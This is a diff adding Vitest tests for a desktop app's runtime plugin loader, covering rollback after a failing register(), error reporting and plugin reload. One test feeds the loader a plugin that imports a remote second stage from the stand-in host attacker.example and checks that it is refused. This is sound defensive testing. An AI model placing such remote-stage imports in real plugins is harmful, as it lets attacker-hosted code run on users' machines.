@@ -668,3 +668,172 @@ export default { id: 'quoted-spec', register: () => { globalThis.__captured = do
     }
   })
 })
+
+describe('register() failure isolation', () => {
+  const withBlobReroute = () => {
+    const createObjectURL = vi
+      .spyOn(URL, 'createObjectURL')
+      .mockImplementation(
+        blob =>
+          `data:text/javascript;base64,${Buffer.from((blob as unknown as { parts: string[] }).parts.join('')).toString('base64')}`
+      )
+
+    const revokeObjectURL = vi.spyOn(URL, 'revokeObjectURL').mockImplementation(() => undefined)
+    const RealBlob = globalThis.Blob
+    vi.stubGlobal(
+      'Blob',
+      class {
+        parts: string[]
+        constructor(parts: string[]) {
+          this.parts = parts
+        }
+      }
+    )
+
+    return () => {
+      createObjectURL.mockRestore()
+      revokeObjectURL.mockRestore()
+      vi.stubGlobal('Blob', RealBlob)
+    }
+  }
+
+  it('a throwing register() rolls back its partial registrations and reports the error on the plugin row', async () => {
+    const restore = withBlobReroute()
+    const marker = '__registerThrowHits'
+    const counters = globalThis as unknown as Record<string, number | undefined>
+    counters[marker] = 0
+
+    try {
+      const source = `
+        import { host } from '@hermes/plugin-sdk'
+        export default {
+          id: 'register-throw',
+          register() {
+            host.onEvent('bot_relay.outbox.pending', () => { globalThis.${marker}++ })
+            throw new Error('register boom')
+          }
+        }
+      `
+
+      await loadRuntimePlugin(source, 'register-throw-folder')
+
+      // The listener registered before the throw is disposed, not orphaned.
+      emitGatewayEvent({ type: 'bot_relay.outbox.pending' } as never)
+      expect(counters[marker]).toBe(0)
+
+      // The failure lands on the plugin's own row so the Plugins tab shows it.
+      expect($pluginRecords.get()['register-throw']).toMatchObject({ status: 'error', error: 'register boom' })
+
+      // Re-enabling neither rejects nor accumulates a second orphan.
+      await expect(setPluginEnabled('register-throw', true)).resolves.toBeUndefined()
+      emitGatewayEvent({ type: 'bot_relay.outbox.pending' } as never)
+      expect(counters[marker]).toBe(0)
+      expect($pluginRecords.get()['register-throw']).toMatchObject({ status: 'error' })
+    } finally {
+      unloadRuntimePlugin('register-throw')
+      delete counters[marker]
+      restore()
+    }
+  })
+
+  it('an async register() rejection is reported on the plugin row instead of leaving it "loaded"', async () => {
+    const restore = withBlobReroute()
+
+    try {
+      await loadRuntimePlugin(
+        "export default { id: 'async-reject', async register() { throw new Error('late boom') } }",
+        'async-reject'
+      )
+
+      await vi.waitFor(() =>
+        expect($pluginRecords.get()['async-reject']).toMatchObject({ status: 'error', error: 'late boom' })
+      )
+    } finally {
+      unloadRuntimePlugin('async-reject')
+      restore()
+    }
+  })
+})
+
+describe('remote static imports are refused (catalog trust)', () => {
+  it('rejects a static URL-scheme import before evaluation', async () => {
+    const importer = vi.fn()
+
+    const id = await loadRuntimePlugin(
+      "import 'https://attacker.example/stage2.js'\nexport default { id: 'remote-import', register() {} }",
+      'remote-import'
+    )
+
+    expect(id).toBeNull()
+    expect(importer).not.toHaveBeenCalled()
+    expect($pluginRecords.get()['remote-import']).toMatchObject({ status: 'error' })
+    expect($pluginRecords.get()['remote-import']?.error).toContain('unsupported import')
+  })
+})
+
+describe('manual "Reload desktop plugins" (#91503)', () => {
+  it('re-reads an already-known plugin.js path and swaps in the new module', async () => {
+    const root = '/local/.hermes/desktop-plugins'
+    desktopPluginsRoot.mockResolvedValue(root)
+    readDir.mockImplementation(async dir => {
+      if (dir === root) {
+        return { entries: [{ isDirectory: true, name: 'replaceable', path: `${root}/replaceable` }] }
+      }
+
+      if (dir === `${root}/replaceable`) {
+        return { entries: [{ isDirectory: false, name: 'plugin.js', path: `${root}/replaceable/plugin.js` }] }
+      }
+
+      return { entries: [] }
+    })
+
+    const registerV1 = vi.fn()
+    const registerV2 = vi.fn()
+    Object.assign(globalThis, { __replaceableV1: registerV1, __replaceableV2: registerV2 })
+    let source = 'export default { id: "replaceable", register: globalThis.__replaceableV1 }'
+    readFileText.mockImplementation(async () => ({ text: source }))
+    let watchN = 0
+    watchPreviewFile.mockImplementation(async () => ({ id: `w-replaceable-${++watchN}` }))
+
+    const createObjectURL = vi
+      .spyOn(URL, 'createObjectURL')
+      .mockImplementation(
+        blob =>
+          `data:text/javascript;base64,${Buffer.from((blob as unknown as { parts: string[] }).parts.join('')).toString('base64')}`
+      )
+
+    const revokeObjectURL = vi.spyOn(URL, 'revokeObjectURL').mockImplementation(() => undefined)
+    const RealBlob = globalThis.Blob
+    vi.stubGlobal(
+      'Blob',
+      class {
+        parts: string[]
+        constructor(parts: string[]) {
+          this.parts = parts
+        }
+      }
+    )
+
+    try {
+      await discoverRuntimePlugins()
+      expect(registerV1).toHaveBeenCalledTimes(1)
+
+      // Atomic directory replacement: same path, same id, new bytes.
+      source = 'export default { id: "replaceable", register: globalThis.__replaceableV2 }'
+      await discoverRuntimePlugins()
+
+      expect(registerV2).toHaveBeenCalledTimes(1)
+      expect(registerV1).toHaveBeenCalledTimes(1)
+      // The old inode's watch is released and the current file is watched again.
+      expect(stopPreviewFileWatch).toHaveBeenCalledWith('w-replaceable-1')
+      expect(watchPreviewFile).toHaveBeenCalledTimes(2)
+    } finally {
+      createObjectURL.mockRestore()
+      revokeObjectURL.mockRestore()
+      vi.stubGlobal('Blob', RealBlob)
+      unloadRuntimePlugin('replaceable')
+      delete (globalThis as unknown as { __replaceableV1?: unknown }).__replaceableV1
+      delete (globalThis as unknown as { __replaceableV2?: unknown }).__replaceableV2
+    }
+  })
+})
